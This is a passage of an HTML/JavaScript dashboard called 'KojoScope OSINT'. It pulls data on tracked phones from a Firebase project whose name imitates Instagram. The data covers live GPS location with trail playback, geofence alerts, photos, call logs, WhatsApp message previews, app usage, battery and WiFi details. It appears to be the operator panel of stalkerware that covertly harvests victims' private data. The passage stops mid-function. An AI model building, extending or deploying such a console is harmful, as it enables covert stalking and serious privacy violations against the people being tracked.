<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>KojoScope OSINT</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<style>
:root{--bg:#0d1117;--card:#161b22;--border:#30363d;--accent:#ffca28;--text:#c9d1d9;--muted:#8b949e;--bronze:#8B7355;--danger:#f85149;--success:#3fb950;--radius:8px}
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden}
.header{background:var(--card);border-bottom:1px solid var(--border);padding:12px 16px;display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.header h1{font-size:18px;font-weight:600;color:var(--accent);display:flex;align-items:center;gap:6px}
.header .status{font-size:12px;padding:3px 10px;border-radius:12px;background:var(--success);color:#000}
.header .status.warn{background:var(--danger)}
.header .read-budget{font-size:11px;color:var(--muted);margin-left:auto}
.device-select{background:var(--bg);color:var(--text);border:1px solid var(--border);padding:4px 10px;border-radius:var(--radius);font-size:13px}
.map-wrap{position:relative;width:100%}
#map{width:100%;height:45vh;z-index:1}
.playback-bar{position:absolute;bottom:0;left:0;right:0;background:rgba(13,17,23,.92);padding:8px 12px;display:flex;align-items:center;gap:10px;z-index:1000;font-size:12px;border-top:1px solid var(--border)}
.playback-bar button{background:var(--border);color:var(--text);border:none;padding:4px 8px;border-radius:4px;cursor:pointer;font-size:11px}
.playback-bar button:hover{background:var(--accent);color:#000}
.playback-bar input[type=range]{flex:1;height:4px;accent-color:var(--accent)}
.playback-bar .ts{color:var(--muted);font-size:11px;white-space:nowrap}
.tabs{display:flex;gap:0;background:var(--card);border-bottom:1px solid var(--border);overflow-x:auto;scrollbar-width:none}
.tab-btn{padding:10px 16px;font-size:13px;border:none;background:none;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
.tab-btn:hover{color:var(--text)}
.content{padding:12px;max-height:50vh;overflow-y:auto}
.content>div{display:none}
.content>div.active{display:block}
.card{background:var(--card);border-left:3px solid var(--accent);padding:12px;margin-bottom:10px;border-radius:0 var(--radius) var(--radius) 0}
.card .time{font-size:11px;color:var(--muted)}
.card .label{font-size:12px;color:var(--muted);margin-bottom:2px}
.card .value{font-size:14px;font-weight:500}
.coord-box{font-family:'SF Mono','Fira Code',monospace;font-size:20px;color:var(--accent);background:var(--bg);padding:8px 12px;border-radius:var(--radius);margin:8px 0}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.photo-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(100px,1fr));gap:6px}
.photo-grid img{width:100%;height:100px;object-fit:cover;border-radius:4px;cursor:pointer}
.bar-chart{margin:6px 0}
.bar-row{display:flex;align-items:center;gap:8px;margin-bottom:4px;font-size:12px}
.bar-fill{height:18px;background:var(--accent);border-radius:3px;min-width:2px}
.bar-label{width:100px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;flex-shrink:0}
.bar-val{color:var(--muted);font-size:11px;width:50px;text-align:right}
table{width:100%;border-collapse:collapse;font-size:12px}
th{text-align:left;padding:6px 4px;color:var(--muted);border-bottom:1px solid var(--border)}
td{padding:6px 4px;border-bottom:1px solid var(--border)}
.filter-chips{display:flex;gap:6px;margin-bottom:8px;flex-wrap:wrap}
.chip{padding:4px 10px;border-radius:12px;font-size:11px;border:1px solid var(--border);background:var(--bg);color:var(--muted);cursor:pointer}
.chip.active{background:var(--accent);color:#000;border-color:var(--accent)}
.lightbox{position:fixed;inset:0;background:rgba(0,0,0,.95);z-index:9999;display:none;justify-content:center;align-items:center;cursor:zoom-out}
.lightbox.open{display:flex}
.lightbox img{max-width:95vw;max-height:95vh;object-fit:contain}
.alert-banner{padding:8px 12px;font-size:12px;display:none}
.alert-banner.show{display:block}
.alert-banner.warn{background:rgba(255,202,40,.15);color:var(--accent);border-bottom:1px solid rgba(255,202,40,.3)}
.alert-banner.error{background:rgba(248,81,73,.15);color:var(--danger);border-bottom:1px solid rgba(248,81,73,.3)}
@media(min-width:768px){
  body{display:grid;grid-template-columns:380px 1fr;grid-template-rows:auto 1fr;height:100vh}
  .header{grid-column:1/-1}
  .sidebar{grid-column:1;overflow:hidden;display:flex;flex-direction:column;border-right:1px solid var(--border)}
  .map-wrap{grid-column:2;grid-row:2}
  #map{height:100%}
  .content{max-height:none;flex:1}
  .tabs+.content{flex:1;overflow-y:auto}
}
</style>
</head>
<body>

<div class="header">
  <h1>&#x1F6F0; KojoScope</h1>
  <select class="device-select" id="deviceSelect"><option value="">No devices</option></select>
  <input type="text" id="manualDevice" placeholder="Manual ID" style="width:90px;background:var(--bg);color:var(--text);border:1px solid var(--border);padding:4px 6px;border-radius:4px;font-size:11px;display:none">
  <button id="manualDeviceBtn" style="display:none;background:var(--border);color:var(--text);border:none;padding:4px 8px;border-radius:4px;font-size:11px;cursor:pointer">Set</button>
  <span class="status" id="statusDot">&#x25CF; Live</span>
  <span class="read-budget" id="readBudget"></span>
</div>

<div class="alert-banner" id="alertBanner"></div>

<div class="sidebar">
  <div class="tabs" id="tabBar">
    <button class="tab-btn active" data-tab="live">&#x1F4CD; Live</button>
    <button class="tab-btn" data-tab="photos">&#x1F4F8; Photos</button>
    <button class="tab-btn" data-tab="timeline">&#x1F4AC; Timeline</button>
    <button class="tab-btn" data-tab="calls">&#x1F4DE; Calls</button>
    <button class="tab-btn" data-tab="apps">&#x1F4CA; Apps</button>
    <button class="tab-btn" data-tab="geofence">&#x2699; Geo</button>
  </div>
  <div class="content" id="tabContent">
    <div class="active" id="tab-live">
      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
        <span class="label">Location</span>
        <span id="locUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
      </div>
      <div class="grid">
        <div><div class="label">Latitude</div><div class="value" id="latVal">--</div></div>
        <div><div class="label">Longitude</div><div class="value" id="lngVal">--</div></div>
        <div><div class="label">Accuracy</div><div class="value" id="accVal">--</div></div>
        <div><div class="label">Speed</div><div class="value" id="spdVal">--</div></div>
        <div><div class="label">Device</div><div class="value" id="devVal">--</div></div>
        <div><div class="label">Battery</div><div class="value" id="batVal">--</div></div>
        <div><div class="label">WiFi</div><div class="value" id="wifiVal">--</div></div>
        <div><div class="label">Last Seen</div><div class="value" id="seenVal">--</div></div>
      </div>
      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-top:8px">
        <span class="label">Device Info</span>
        <span id="metaUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
      </div>
      <div class="coord-box" id="coordBox" style="cursor:pointer" title="Click to copy">--</div>
      <div class="label">Address</div>
      <div class="value" id="addrVal" style="font-size:13px;color:var(--muted)">--</div>
    </div>
    <div id="tab-photos">
      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
        <span class="label">Photos</span>
        <span id="photoUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
      </div>
      <div class="photo-grid" id="photoGrid"><div class="label">No photos yet</div></div>
    </div>
    <div id="tab-timeline">
      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
        <span class="label">Timeline</span>
        <span id="timelineUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
      </div>
      <div class="filter-chips" id="timelineChips">
        <span class="chip active" data-filter="all">All</span>
        <span class="chip" data-filter="location">&#x1F4CD; Location</span>
        <span class="chip" data-filter="call">&#x1F4DE; Call</span>
        <span class="chip" data-filter="whatsapp">&#x1F4AC; WhatsApp</span>
      </div>
      <div id="timelineList"></div>
    </div>
    <div id="tab-calls">
      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
        <span class="label">Call Logs</span>
        <span id="callsUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
      </div>
      <table><thead><tr><th>Time</th><th>Number</th><th>Duration</th><th>Type</th></tr></thead><tbody id="callsBody"></tbody></table>
    </div>
    <div id="tab-apps">
      <div style="display:flex;justify-content:space-between;align-items:baseline;margin-bottom:8px">
        <span class="label">App Usage</span>
        <span id="appsUpdated" class="label" style="font-size:10px;color:var(--bronze)">--</span>
      </div>
      <div id="appsChart"></div>
    </div>
    <div id="tab-geofence"><div id="geofenceList"></div></div>
  </div>
</div>

<div class="map-wrap">
  <div id="map"></div>
  <div class="playback-bar" id="playbackBar" style="display:none">
    <button id="playBtn">&#x25B6;</button>
    <button id="rewindBtn">&#x23EE;</button>
    <select id="speedSelect" style="background:var(--bg);color:var(--text);border:1px solid var(--border);font-size:11px;padding:2px 4px">
      <option value="1">1x</option><option value="5">5x</option><option value="10" selected>10x</option><option value="50">50x</option>
    </select>
    <input type="range" id="playScrubber" min="0" max="100" value="0">
    <span class="ts" id="playTs">--</span>
    <span class="ts" id="playCount">0/0</span>
  </div>
</div>

<div class="lightbox" id="lightbox"><img id="lightboxImg" alt=""></div>

<script>
// --- Firebase Config ---
const RTDB = 'https://instgram-7148c-default-rtdb.europe-west1.firebasedatabase.app';
const FIRESTORE = 'https://firestore.googleapis.com/v1/projects/instgram-7148c/databases/%28default%29/documents';
const PKT = 'Asia/Karachi';

// --- State ---
let devices = {};
let selectedDevice = null;
let locationHistory = [];
let marker, accuracyCircle, trail;
let geofences = JSON.parse(localStorage.getItem('geofences') || '[]');
let alertedZones = new Set();
let readBudget = JSON.parse(localStorage.getItem('readBudget') || '{"count":0,"day":""}');
let cachedPhotos = {};
let cachedAddresses = JSON.parse(localStorage.getItem('geoCache') || '{}');
let nomQueue = [];
let nomProcessing = false;
let playbackRunning = false;
let lastUpdateTime = 0;
const lastCategoryTimes = {};
function setCategoryTime(cat, ts) {
  if (!ts) return;
  lastCategoryTimes[cat] = Math.max(lastCategoryTimes[cat] || 0, ts);
  const el = document.getElementById(cat + 'Updated');
  if (el) el.textContent = pkt(ts);
}
let playbackIdx = 0;
let playbackTimer = null;
let cameraHome = null;

// --- Polyfill Promise.allSettled for iOS 12-13 ---
if (!Promise.allSettled) {
  Promise.allSettled = function(promises) {
    return Promise.all(promises.map(p => Promise.resolve(p).then(
      value => ({ status: 'fulfilled', value }),
      reason => ({ status: 'rejected', reason })
    )));
  };
}

// --- Poll Timers ---
let pollTimers = [];
const BASE_INTERVALS = { loc: 3000, hist: 60000, meta: 30000, photos: 60000, apps: 60000 };
let intervals = { ...BASE_INTERVALS };

// --- Init Map (with Leaflet-load guard for iOS content blockers) ---
let map;
try {
  map = L.map('map').setView([33.6844, 73.0479], 13);
  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
    attribution: '&copy; OpenStreetMap', maxZoom: 19
  }).addTo(map);
} catch(e) {
  console.warn('Leaflet failed to load (content blocker?):', e);
  document.getElementById('map').innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted)">Map unavailable</div>';
}

// --- Read Budget ---
function trackRead(count = 1) {
  const today = new Date().toISOString().slice(0,10);
  if (readBudget.day !== today) { readBudget = { count: 0, day: today }; }
  readBudget.count += count;
  localStorage.setItem('readBudget', JSON.stringify(readBudget));
  const pct = Math.round(readBudget.count / 50000 * 100);
  document.getElementById('readBudget').textContent = `\u{1F4CA} ${readBudget.count.toLocaleString()}/50K`;
  if (readBudget.count > 40000) {
    intervals.loc = 10000; intervals.hist = 60000; intervals.meta = 60000;
    intervals.photos = 120000; intervals.apps = 120000;
    showAlert('Approaching Firebase read limit \u2014 reduced poll rate', 'warn');
  } else {
    intervals = { ...BASE_INTERVALS };
  }
}

// --- Alert ---
function showAlert(msg, type = 'warn') {
  const el = document.getElementById('alertBanner');
  el.textContent = msg; el.className = 'alert-banner show ' + type;
  setTimeout(() => el.classList.remove('show'), 8000);
}

// --- Nominatim Geocode ---
function geocode(lat, lng) {
  const key = lat.toFixed(3) + ',' + lng.toFixed(3);
  if (cachedAddresses[key]) return Promise.resolve(cachedAddresses[key]);
  return new Promise(resolve => {
    nomQueue.push({ lat, lng, key, resolve });
    if (!nomProcessing) processNomQueue();
  });
}
async function processNomQueue() {
  nomProcessing = true;
  while (nomQueue.length) {
    const { lat, lng, key, resolve } = nomQueue.shift();
    try {
      const r = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json`);
      const d = await r.json();
      cachedAddresses[key] = d;
      localStorage.setItem('geoCache', JSON.stringify(cachedAddresses));
      resolve(d);
    } catch { resolve(null); }
    await new Promise(r => setTimeout(r, 1100));
  }
  nomProcessing = false;
}

// --- Haversine ---
function haversine(lat1, lng1, lat2, lng2) {
  const R = 6371000;
  const dLat = (lat2 - lat1) * Math.PI / 180;
  const dLng = (lng2 - lng1) * Math.PI / 180;
  const a = Math.sin(dLat/2)**2 + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLng/2)**2;
  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
}

// --- Douglas-Peucker ---
function simplify(points, tolerance = 300) {
  if (points.length <= 2) return points;
  let maxDist = 0, maxIdx = 0;
  const first = points[0], last = points[points.length - 1];
  for (let i = 1; i < points.length - 1; i++) {
    const d = perpendicularDist(points[i], first, last);
    if (d > maxDist) { maxDist = d; maxIdx = i; }
  }
  if (maxDist > tolerance) {
    const left = simplify(points.slice(0, maxIdx + 1), tolerance);
    const right = simplify(points.slice(maxIdx), tolerance);
    return left.slice(0, -1).concat(right);
  }
  return [first, last];
}
function perpendicularDist(p, a, b) {
  const dx = b[0] - a[0], dy = b[1] - a[1];
  const num = Math.abs(dy * p[0] - dx * p[1] + b[0] * a[1] - b[1] * a[0]);
  const den = Math.sqrt(dx*dx + dy*dy);
  return den ? num / den : 0;
}

// --- PKT Format ---
function pkt(ts) {
  const d = new Date(ts);
  return d.toLocaleString('en-PK', { timeZone: PKT, hour12: false,
    year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' });
}
function pktShort(ts) {
  const d = new Date(ts);
  return d.toLocaleString('en-PK', { timeZone: PKT, hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
}

// --- Geofences ---
function saveGeofences() {
  localStorage.setItem('geofences', JSON.stringify(geofences));
  renderGeofenceList();
}
function addGeofence(lat, lng) {
  const name = prompt('Geofence name:');
  if (!name) return;
  geofences.push({ id: Date.now().toString(), name, lat, lng, radius: 100, active: true });
  saveGeofences();
  renderGeofences();
}
function renderGeofences() {
  map.eachLayer(l => { if (l._isGeofence) map.removeLayer(l); });
  geofences.filter(g => g.active).forEach(g => {
    L.circle([g.lat, g.lng], { radius: g.radius, color: '#ffca28', fillOpacity: 0.1, dashArray: '5,10' })
      ._isGeofence = true;
  });
}
function checkGeofences(lat, lng) {
  geofences.filter(g => g.active).forEach(g => {
    const dist = haversine(lat, lng, g.lat, g.lng);
    const inside = dist <= g.radius;
    if (inside && !alertedZones.has(g.id)) {
      if (Notification.permission === 'granted') new Notification('Geofence: ' + g.name, { body: 'Device entered ' + g.name });
      alertedZones.add(g.id);
    } else if (!inside) alertedZones.delete(g.id);
  });
}
function renderGeofenceList() {
  const el = document.getElementById('geofenceList');
  if (!geofences.length) { el.innerHTML = '<div class="label">Right-click map to add geofence</div>'; return; }
  el.innerHTML = geofences.map(g => `
    <div class="card" style="border-left-color:${g.active?'var(--accent)':'var(--border)'}">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <span>${g.name}</span>
        <span style="font-size:11px;color:var(--muted)">${g.lat.toFixed(4)}, ${g.lng.toFixed(4)}</span>
      </div>
      <div style="display:flex;gap:10px;margin-top:6px;font-size:12px">
        <label>Radius: <input type="range" min="20" max="500" value="${g.radius}" data-gf="${g.id}" class="gf-radius" style="width:80px;accent-color:var(--accent)"> ${g.radius}m</label>
        <button class="chip" data-gf="${g.id}" data-action="toggle">${g.active?'On':'Off'}</button>
        <button class="chip" data-gf="${g.id}" data-action="delete" style="border-color:var(--danger)">Delete</button>
      </div>
    </div>`).join('');
}
document.addEventListener('click', e => {
  const btn = e.target.closest('[data-action]');
  if (!btn) return;
  const id = btn.dataset.gf;
  const gf = geofences.find(g => g.id === id);
  if (!gf) return;
  if (btn.dataset.action === 'toggle') { gf.active = !gf.active; saveGeofences(); renderGeofences(); }
  if (btn.dataset.action === 'delete') { geofences = geofences.filter(g => g.id !== id); saveGeofences(); renderGeofences(); }
});
document.addEventListener('input', e => {
  if (e.target.classList.contains('gf-radius')) {
    const id = e.target.dataset.gf;
    const gf = geofences.find(g => g.id === id);
    if (gf) { gf.radius = parseInt(e.target.value); saveGeofences(); renderGeofences(); }
  }
});
map.on('contextmenu', e => addGeofence(e.latlng.lat, e.latlng.lng));

// --- Photo Lightbox ---
document.addEventListener('click', e => {
  const img = e.target.closest('.photo-grid img');
  if (img) {
    document.getElementById('lightboxImg').src = img.src;
    document.getElementById('lightbox').classList.add('open');
  }
});
document.getElementById('lightbox').addEventListener('click', function() {
  this.classList.remove('open');
});

// --- Tabs ---
document.querySelectorAll('.tab-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.content > div').forEach(d => d.classList.remove('active'));
    btn.classList.add('active');
    document.getElementById('tab-' + btn.dataset.tab).classList.add('active');
  });
});

// --- Tab-aware polling ---
document.addEventListener('visibilitychange', () => {
  if (document.hidden) { stopPolling(); }
  else { try { startPolling(); pollAll(); } catch(e) { console.warn('visibilitychange error:', e); } }
});

// --- Manual ID Entry ---
document.getElementById('manualDeviceBtn').addEventListener('click', function() {
  const id = document.getElementById('manualDevice').value.trim();
  if (!id) return;
  devices = {}; selectedDevice = null;
  devices[id] = { id, label: id.slice(0,12) };
  const sel = document.getElementById('deviceSelect');
  sel.innerHTML = `<option value="${id}">${id.slice(0,12)}</option>`;
  sel.value = id;
  selectedDevice = id;
  document.getElementById('manualDevice').style.display = 'none';
  this.style.display = 'none';
  locationHistory = []; cachedPhotos = {};
  if (trail && map) try { map.removeLayer(trail); } catch(e) {}
  pollAll();
});

// --- Device Select ---
document.getElementById('deviceSelect').addEventListener('change', function() {
  selectedDevice = this.value;
  locationHistory = [];
  cachedPhotos = {};
  if (trail && map) try { map.removeLayer(trail); } catch(e) {}
  pollAll();
});

// --- Polling ---
function stopPolling() {
  pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
}
function startPolling() {
  stopPolling();
  schedulePoll('loc', intervals.loc, pollLocation);
  schedulePoll('meta', intervals.meta, pollMeta);
  schedulePoll('photos', intervals.photos, pollPhotos);
  schedulePoll('apps', intervals.apps, pollApps);
  schedulePoll('hist', intervals.hist, pollHistory);
}
function schedulePoll(name, interval, fn) {
  async function run() {
    try { await fn(); } catch {}
    if (!document.hidden) pollTimers.push(setTimeout(run, interval));
  }
  pollTimers.push(setTimeout(run, interval));
}

async function pollAll() {
  await Promise.allSettled([pollLocation(), pollMeta(), pollPhotos(), pollApps(), pollHistory()]);
}

// --- Firebase helpers ---
// Firestore REST API (has CORS) — preferred
async function fetchFirestore(path, silent = false) {
  trackRead();
  try {
    const r = await fetch(`${FIRESTORE}/${path}`);
    if (!r.ok) { if (!silent) console.warn('fetchFirestore', path, r.status); return null; }
    return r.json();
  } catch(e) { if (!silent) { console.warn('fetchFirestore error', path, e); showAlert('Firestore fetch failed: ' + path.slice(0,40), 'error'); } return null; }
}
async function listFirestoreDocs(path) {
  trackRead();
  try {
    const r = await fetch(`${FIRESTORE}/${path}?pageSize=50`);
    if (!r.ok) { console.warn('listFirestoreDocs', path, r.status); return []; }
    const data = await r.json();
    return data.documents || [];
  } catch(e) { console.warn('listFirestoreDocs error', path, e); return []; }
}
async function runFirestoreQuery(parentDoc, collectionId, field, op, value, limit = 50) {
  trackRead();
  try {
    const body = JSON.stringify({
      structuredQuery: {
        from: [{ collectionId }],
        where: { fieldFilter: { field: { fieldPath: field }, op, value: { integerValue: String(value) } } },
        orderBy: [{ field: { fieldPath: field }, direction: 'ASCENDING' }],
        limit
      }
    });
    const r = await fetch(`${FIRESTORE}/${parentDoc}:runQuery`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body
    });
    if (!r.ok) return [];
    const results = await r.json();
    return results.filter(r => r.document).map(r => r.document);
  } catch { return []; }
}
// Collection group query across ALL parent docs (e.g., all `info` docs under devices/*/)
async function fetchFirestoreCollectionGroup(collectionId, limit = 50) {
  trackRead();
  try {
    const body = JSON.stringify({
      structuredQuery: {
        from: [{ collectionId, allDescendants: true }],
        limit
      }
    });
    const r = await fetch(`${FIRESTORE}:runQuery`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' }, body
    });
    if (!r.ok) return [];
    const results = await r.json();
    return results.filter(r => r.document).map(r => r.document);
  } catch { return []; }
}
// RTDB supports CORS — use fetch() directly
async function fetchRTDB(path, query) {
  trackRead();
  const url = `${RTDB}/${path}.json${query ? '?'+query : ''}`;
  try {
    const r = await fetch(url);
    if (r.ok) return r.json();
  } catch {}
  return null;
}
// Try Firestore first, fall back to RTDB JSONP for backward compat
async function fetchMetrics(id) {
  const doc = await fetchFirestore(`devices/${id}/metrics/latest`);
  if (doc && doc.fields) return firestoreFieldsToObj(doc.fields);
  const m = await fetchRTDB(`devices/${id}/metrics/latest`);
  return m;
}
function firestoreFieldsToObj(fields) {
  const o = {};
  for (const k in fields) {
    const v = fields[k];
    if (v.stringValue !== undefined) o[k] = v.stringValue;
    else if (v.integerValue !== undefined) o[k] = parseInt(v.integerValue);
    else if (v.doubleValue !== undefined) o[k] = v.doubleValue;
    else if (v.booleanValue !== undefined) o[k] = v.booleanValue;
    else o[k] = v;
  }
  return o;
}

function makeDeviceOptions(docs, idField, labelFn) {
  const sel = document.getElementById('deviceSelect');
  const opts = [];
  for (const doc of docs) {
    const id = typeof idField === 'function' ? idField(doc) : doc[idField];
    if (!id) continue;
    const label = labelFn(doc, id);
    if (!devices[id]) devices[id] = { id, label };
    opts.push(`<option value="${id}">${label}</option>`);
  }
  if (opts.length) { sel.innerHTML = opts.join(''); return true; }
  return false;
}
async function fetchDevices() {
  // 1. Firestore collection group query on `info` docs
  const infoDocs = await fetchFirestoreCollectionGroup('info', 20);
  if (infoDocs && infoDocs.length) {
    devices = {};
    if (makeDeviceOptions(infoDocs,
      d => { const p = d.name.split('/'); const i = p.indexOf('devices'); return i >= 0 ? p[i+1] : null; },
      (d, id) => { const f = d.fields || {}; return [f.manufacturer?.stringValue, f.deviceModel?.stringValue].filter(Boolean).join(' ') || id.slice(0,8); }
    )) { selectFirstDevice(); return; }
  }
  // 2. Firestore collection group query on `usage` docs (deviceSync exists with old apps too)
  const usageDocs = await fetchFirestoreCollectionGroup('usage', 20);
  if (usageDocs && usageDocs.length) {
    devices = {};
    if (makeDeviceOptions(usageDocs,
      d => { const p = d.name.split('/'); const i = p.indexOf('devices'); return i >= 0 ? p[i+1] : null; },
      (d, id) => id.slice(0,8)
    )) { selectFirstDevice(); return; }
  }
  // 3. RTDB shallow query (JSONP + fetch fallback)
  const data = await fetchRTDB('devices', 'shallow=true');
  if (data) {
    const keys = Object.keys(data);
    if (keys.length) {
      devices = {};
      const sel = document.getElementById('deviceSelect');
      sel.innerHTML = keys.map(k => `<option value="${k}">${k.slice(0,8)}...</option>`).join('');
      devices = keys.reduce((acc, id) => { acc[id] = { id, label: id.slice(0,8) + '...' }; return acc; }, {});
      selectFirstDevice();
      return;
    }
  }
  // Show manual entry field as fallback
  document.getElementById('statusDot').textContent = '\u2716 No data';
  document.getElementById('statusDot').className = 'status warn';
  document.getElementById('manualDevice').style.display = 'inline';
  document.getElementById('manualDeviceBtn').style.display = 'inline';
  showAlert('Auto-discovery failed. Enter device ID manually or check console for errors.', 'error');
}
function selectFirstDevice() {
  const keys = Object.keys(devices);
  if (!selectedDevice || !devices[selectedDevice]) selectedDevice = keys[0];
  document.getElementById('deviceSelect').value = selectedDevice;
}

async function pollLocation() {
  if (!selectedDevice) return;
  const loc = await fetchRTDB(`devices/${selectedDevice}/location/latest`);
  if (!loc || !loc.lat) return;
  updateLocationUI(loc);
  updateMap(loc);
  checkGeofences(loc.lat, loc.lng);
  setCategoryTime('loc', parseInt(loc.ts_ms || '0'));
}
async function pollMeta() {
  if (!selectedDevice) return;
  const m = await fetchMetrics(selectedDevice);
  if (!m) return;
  document.getElementById('batVal').textContent = (m.batteryPct || '--') + '%' + (m.isCharging ? ' \u26A1' : '');
  document.getElementById('wifiVal').textContent = m.wifiSsid || '--';
  document.getElementById('devVal').textContent = m.deviceModel || '--';
  // Update device label in dropdown with model name if known
  if (m.deviceModel && devices[selectedDevice]) {
    const label = [m.manufacturer, m.deviceModel].filter(Boolean).join(' ');
    devices[selectedDevice].label = label;
    document.querySelector(`#deviceSelect option[value="${selectedDevice}"]`).textContent = label;
  }
  const ts = parseInt(m.ts_ms || '0');
  if (ts > lastUpdateTime) {
    lastUpdateTime = ts;
    document.getElementById('statusDot').textContent = '\u25CF Live';
    document.getElementById('statusDot').className = 'status';
  }
  setCategoryTime('meta', ts);
}
let lastPhotoTs = 0;
async function pollPhotos() {
  if (!selectedDevice) return;
  let docs;
  if (lastPhotoTs > 0) {
    docs = await runFirestoreQuery(`devices/${selectedDevice}`, 'photos', 'timestamp', 'GREATER_THAN', lastPhotoTs, 10);
  } else {
    docs = await listFirestoreDocs(`devices/${selectedDevice}/photos`);
  }
  // If no Firestore docs, try RTDB
  if (!docs || !docs.length) {
    const rtdbData = await fetchRTDB(`devices/${selectedDevice}/photos`);
    if (rtdbData && typeof rtdbData === 'object') {
      docs = Object.entries(rtdbData).map(([k,v]) => {
        const f = {};
        if (v.data) f.data = {stringValue: v.data};
        if (v.timestamp) f.timestamp = {integerValue: String(v.timestamp)};
        return { name: k, fields: f };
      }).sort((a,b) => {
        const ta = parseInt(a.fields?.timestamp?.integerValue || '0');
        const tb = parseInt(b.fields?.timestamp?.integerValue || '0');
        return tb - ta;
      });
    }
  }
  const grid = document.getElementById('photoGrid');
  for (const doc of (docs || [])) {
    const ts = parseInt(doc.name?.split('/')?.pop() || doc.name || '0');
    if (cachedPhotos[ts]) continue;
    const fields = doc.fields || {};
    const data = fields.data?.stringValue || '';
    const docTs = parseInt(fields.timestamp?.integerValue || '0');
    if (docTs > lastPhotoTs) lastPhotoTs = docTs;
    if (data && data.startsWith('/9j/')) {
      cachedPhotos[ts] = data;
      const img = document.createElement('img');
      img.src = 'data:image/jpeg;base64,' + data;
      img.alt = pkt(ts);
      img.title = pkt(ts);
      grid.prepend(img);
    }
  }
  if (!Object.keys(cachedPhotos).length) grid.innerHTML = '<div class="label">No photos yet</div>';
  if (docs && docs.length) setCategoryTime('photo', lastPhotoTs);
}
async function pollApps() {
  if (!selectedDevice) return;
  let docs = await listFirestoreDocs(`devices/${selectedDevice}/apps`);
  // Fallback to RTDB
  if (!docs || !docs.length) {
    const rtdbData = await fetchRTDB(`devices/${selectedDevice}/apps`);
    if (rtdbData && typeof rtdbData === 'object') {
      docs = Object.values(rtdbData).map(v => ({
        fields: {
          appName: {stringValue: v.appName || v.name || '?'},
          totalForegroundMs: {integerValue: String(v.totalForegroundMs || v.ms || 0)},
          lastUsedMs: {integerValue: String(v.lastUsedMs || v.ts || 0)}
        }
      }));
    }
  }
  const chart = document.getElementById('appsChart');
  if (!docs || !docs.length) {
    chart.innerHTML = '<div class="label">No app usage data yet</div>';
    return;
  }
  const sorted = docs.map(d => {
    const f = d.fields || {};
    return { name: f.appName?.stringValue || '?', ms: parseInt(f.totalForegroundMs?.integerValue || '0') };
  }).sort((a, b) => b.ms - a.ms).slice(0, 15);
  const maxMs = sorted.length ? sorted[0].ms : 1;
  chart.innerHTML = sorted.map(a => `
    <div class="bar-row">
      <span class="bar-label">${a.name}</span>
      <div class="bar-fill" style="width:${(a.ms/maxMs*100).toFixed(0)}%"></div>
      <span class="bar-val">${(a.ms/60000).toFixed(1)}m</span>
    </div>`).join('');
  if (docs.length) {
    const lastTs = parseInt(docs[0].fields?.lastUsedMs?.integerValue || '0');
    if (lastTs) setCategoryTime('apps', lastTs);
  }
}
async function pollHistory() {
  if (!selectedDevice) return;
  let docs = await listFirestoreDocs(`devices/${selectedDevice}/timeline`);
  // Fallback to RTDB
  if (!docs || !docs.length) {
    const rtdbData = await fetchRTDB(`devices/${selectedDevice}/timeline`);
    if (rtdbData && typeof rtdbData === 'object') {
      docs = Object.entries(rtdbData).map(([k,v]) => ({
        name: k,
        fields: {
          type: {stringValue: v.type || 'event'},
          ts_ms: {integerValue: String(v.ts_ms || v.timestamp || 0)},
          contactName: {stringValue: v.contactName || v.contact || ''},
          messagePreview: {stringValue: v.messagePreview || v.message || ''},
          duration: {stringValue: v.duration || ''},
          direction: {stringValue: v.direction || ''}
        }
      })).sort((a,b) => {
        const ta = parseInt(a.fields.ts_ms?.integerValue || '0');
        const tb = parseInt(b.fields.ts_ms?.integerValue || '0');
        return tb - ta;
      });
    }
  }
  renderTimeline(docs.slice(0, 30));
  renderCalls(docs.slice(0, 30));
  if (docs.length) {
    const ts = parseInt(docs[0].fields?.ts_ms?.integerValue || '0');
    if (ts) { setCategoryTime('timeline', ts); setCategoryTime('calls', ts); }
  }
}

// --- Update UI ---
function updateLocationUI(loc) {
  document.getElementById('latVal').textContent = loc.lat.toFixed(6) + '\u00B0';
  document.getElementById('lngVal').textContent = loc.lng.toFixed(6) + '\u00B0';
  document.getElementById('accVal').textContent = loc.accuracy + 'm';
  document.getElementById('spdVal').textContent = (loc.speed || 0).toFixed(1) + ' m/s';
